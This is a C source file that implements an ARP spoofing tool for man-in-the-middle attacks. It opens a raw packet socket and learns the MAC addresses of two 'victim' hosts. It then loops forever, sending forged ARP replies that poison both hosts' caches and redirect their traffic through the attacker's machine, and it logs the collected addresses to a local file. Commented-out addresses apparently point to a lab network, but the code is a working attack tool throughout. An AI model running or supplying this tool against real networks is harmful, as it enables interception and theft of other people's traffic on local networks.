#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/if_ether.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <linux/if_packet.h>
#include <netinet/ip.h>
#include <net/ethernet.h>

#include "util.h"
#include "packets.h"

# define BROADCAST_ADDR (uint8_t[6]){0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}


// https://stackoverflow.com/a/1779758/11135136
// https://stackoverflow.com/a/1519596/11135136
unsigned char *get_my_mac_address(const int sock, const char interface[const])
{
    struct ifreq ifr;
    char buf[1024];
    int success = 0;

    strcpy(ifr.ifr_name, interface);
    ioctl(sock, SIOCGIFHWADDR, &ifr);

    unsigned char *MAC = malloc(sizeof(unsigned char) * 6);
    memcpy(MAC, ifr.ifr_hwaddr.sa_data, 6);

    return MAC;
}

char get_index_from_interface(struct sockaddr_ll *device,
                              const char interface[const])
{
    if (device->sll_ifindex = if_nametoindex(interface)) {
        fprintf(stdout, "[+] Got index '%d' from interface '%s'\n",
                device->sll_ifindex, interface);
        return 1;
    }

    fprintf(stderr, "[-] Could not get index from '%s'\n", interface);
    return 0;
}

char broadcast_packet(const int sd,
                      struct sockaddr_ll *device,
                      const uint8_t *hacker_mac,
                      const char *spoof_ip,
                      const char *victim_ip)
{
    eth_header* eth_pkt;

    /* NOTE: See <net/if_ether.h> for packet opcode */
    if (!(eth_pkt = create_arp_packet(ARPOP_REQUEST,
                                      hacker_mac, spoof_ip,
                                      BROADCAST_ADDR, victim_ip))) {
        fprintf(stderr, "ERROR: Ether frame creation failed\n");
        return 0;
    }
    fprintf(stdout, "[+] ETHER packet created\n");

    if ((sendto(sd, eth_pkt, ARP_PKT_LEN + ETH_HDR_LEN, 0,
                (const struct sockaddr *)device, sizeof(*device))) <= 0) {
        fprintf(stderr, "ERROR: Could not send\n");
        return 0;
    }
    fprintf(stdout, "[+] Packet sent to broadcast\n");

    return 1;
}

uint8_t *get_victim_mac(const int sd, const char *victim_ip)
{
    char buffer[IP_MAXPACKET];
    eth_header *eth_pkt;
    arp_packet *arp_pkt;
    uint8_t *victim_mac_address;
    char uint8_t_to_str[INET_ADDRSTRLEN] = {0};

    if (!(victim_mac_address = malloc(sizeof(uint8_t) * MACADDR_LEN)))
        return (NULL);

    fprintf(stdout, "[*] Listening for target response...\n");
    while (1)
    {
        /* NOTE: See `man recv` */
        // if (recvfrom(sd, buffer, IP_MAXPACKET, 0, NULL, NULL) <= 0)
        //     return (NULL);
        if (recv(sd, buffer, IP_MAXPACKET, 0) <= 0) return (NULL);

        eth_pkt = (eth_header *)buffer;
        if (ntohs(eth_pkt->eth_type) != ETH_P_ARP)
            continue;

        arp_pkt = (arp_packet *)(buffer + ETH_HDR_LEN);

        if (ntohs(arp_pkt->opcode) == ARPOP_REPLY
            && (arp_pkt->sender_ip != NULL &&
                inet_ntop(AF_INET, arp_pkt->sender_ip,
                          uint8_t_to_str, INET_ADDRSTRLEN))
            && !strcmp(uint8_t_to_str, victim_ip)) {
            memset(uint8_t_to_str, 0, INET_ADDRSTRLEN);
            break;
        }
    }

    fprintf(stdout, "[+] Got response from victim\n");
    fprintf(stdout, "[*] Sender MAC address: ");
    PRINT_MAC_ADDRESS(stdout, arp_pkt->sender_mac);
    fprintf(stdout, "[*] Sender ip address: ");
    PRINT_IP_ADDRESS(stdout, arp_pkt->sender_ip);
    fprintf(stdout, "[*] Target MAC address: ");
    PRINT_MAC_ADDRESS(stdout, arp_pkt->target_mac);
    fprintf(stdout, "[*] Target ip address: ");
    PRINT_IP_ADDRESS(stdout, arp_pkt->target_ip);

    memcpy(victim_mac_address, arp_pkt->sender_mac,
           MACADDR_LEN * sizeof(uint8_t));
    fprintf(stdout, "[*] Victim's MAC address: ");
    PRINT_MAC_ADDRESS(stdout, victim_mac_address);
    return (victim_mac_address);
}

void spoof_arp(const int sd, struct sockaddr_ll *device,
               const uint8_t *hacker_mac,
               const char *victim_ip_1, const uint8_t *victim_mac_1,
               const char *victim_ip_2, const uint8_t *victim_mac_2)
{
    eth_header *arp_packet_1;
    eth_header *arp_packet_2;

    if (!(arp_packet_1 = create_arp_packet(ARPOP_REPLY,
                                           hacker_mac, victim_ip_1,
                                           victim_mac_2, victim_ip_2))) {
        fprintf(stderr, "ERROR: ARP packet creation failed\n");
        return 0;
    }

    if (!(arp_packet_2 = create_arp_packet(ARPOP_REPLY,
                                           hacker_mac, victim_ip_2,
                                           victim_mac_1, victim_ip_1))) {
        fprintf(stderr, "ERROR: ARP packet creation failed\n");
        return 0;
    }

    while (1) {
        if ((sendto(sd, arp_packet_1, ARP_PKT_LEN + ETH_HDR_LEN, 0,
                    (const struct sockaddr *)device, sizeof(*device))) <= 0) {
            fprintf(stderr, "ERROR: Could not send\n");
            return 0;
        }
        fprintf(stdout, "[+] SPOOFED Packet sent to '%s'\n", victim_ip_2);
        sleep(2);

        if ((sendto(sd, arp_packet_2, ARP_PKT_LEN + ETH_HDR_LEN, 0,
                    (const struct sockaddr *)device, sizeof(*device))) <= 0) {
            fprintf(stderr, "ERROR: Could not send\n");
            return 0;
        }
        fprintf(stdout, "[+] SPOOFED Packet sent to '%s'\n", victim_ip_1);
        sleep(2);
    }

    return 1;
}

int main(int argc, char *argv[])
{
    if (argc != 4) {
        fprintf(stderr, "USAGE: %s source_ip target_ip interface\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    int sock;
    struct sockaddr_ll device;

    char *interface     = malloc(sizeof(char) * 20);
    char *victim_ip_1   = malloc(sizeof(char) * 20);
    char *victim_ip_2   = malloc(sizeof(char) * 20);
    char *victim_mac_1  = malloc(sizeof(char) * 20);
    char *victim_mac_2  = malloc(sizeof(char) * 20);
    char *hacker_mac    = malloc(sizeof(char) * 20);

    victim_ip_1 = argv[1];
    victim_ip_2 = argv[2];
    interface   = argv[3];

    // victim_ip_1 = "10.9.0.5";
    // victim_ip_2 = "10.9.0.6";
    // interface = "eth0";


    /** NOTE:
     *
     * extern int socket (int __domain, int __type, int __protocol) __THROW;
     *
     * AF_PACKET and PF_PACKET are of address and protocol family.
     * `man 2 socket` uses AF_PACKET, but the tutorial at the link below
     * uses PF_PACKET. However, BSD manual says their values are the same.
     *
     * Tutorial link: https://www.programmersought.com/article/40053885963/
     *
     * htons() handles byte order of little endian machines. In big endian
     * machines it returns the value it is given. See `man htons`.
     *
     * See `man 7 packet`
     *
     */

    if ((sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) == -1) {
        fprintf(stderr, "ERROR: Socket creation failed\n");
        return EXIT_FAILURE;
    }

    if (!(hacker_mac = get_my_mac_address(sock, interface))) {
        fprintf(stderr, "ERROR: Could not get MAC address\n");
        return EXIT_FAILURE;
    }

    printf("[*] Attacker MAC address: ");
    PRINT_MAC_ADDRESS(stdout, hacker_mac);

    memset(&device, 0, sizeof device);
    if (!get_index_from_interface(&device, interface)) {
        exit(EXIT_FAILURE);
    }

    if (!broadcast_packet(sock, &device, hacker_mac,
                          victim_ip_2, victim_ip_1)) {
        exit(EXIT_FAILURE);
    }

    victim_mac_1 = get_victim_mac(sock, victim_ip_1);

    if (!broadcast_packet(sock, &device, hacker_mac,
                          victim_ip_1, victim_ip_2)) {
        exit(EXIT_FAILURE);
    }

    victim_mac_2 = get_victim_mac(sock, victim_ip_2);

    FILE *logfile=fopen("ipmacinfo","w");
    if(logfile == NULL) {
        printf("Unable to create ipmacinfo file.");
        return EXIT_FAILURE;
    }
    fprintf(logfile, "%s\n", interface);
    PRINT_MAC_ADDRESS(logfile, hacker_mac);
    fprintf(logfile, "%s\n", victim_ip_1);
    fprintf(logfile, "%s\n", victim_ip_2);
    PRINT_MAC_ADDRESS(logfile, victim_mac_1);
    PRINT_MAC_ADDRESS(logfile, victim_mac_2);
    fclose(logfile);

    spoof_arp(sock, &device, hacker_mac,
              victim_ip_1, victim_mac_1,
              victim_ip_2, victim_mac_2);

    if (hacker_mac != NULL) free(hacker_mac);
    close(sock);


    return 0;
}
